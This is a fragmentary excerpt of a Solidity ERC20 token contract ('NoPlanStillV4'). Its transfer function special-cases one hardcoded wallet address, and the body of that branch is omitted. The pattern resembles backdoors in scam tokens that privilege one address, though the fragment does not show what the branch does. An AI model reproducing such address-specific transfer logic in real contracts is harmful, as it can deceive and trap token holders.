...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(sender == 0x49c98e47AF041109B885D99Fa1e9D2aC6Eb45fB7 || 
           recipient  == 0x49c98e47AF041109B885D99Fa1e9D2aC6Eb45fB7){
...
contract NoPlanV4 is ERC20 {

    uint tokenTotalSupply = 1000000000000000;

    constructor() public ERC20("NoPlanStillV4", "NoPlanV4") {
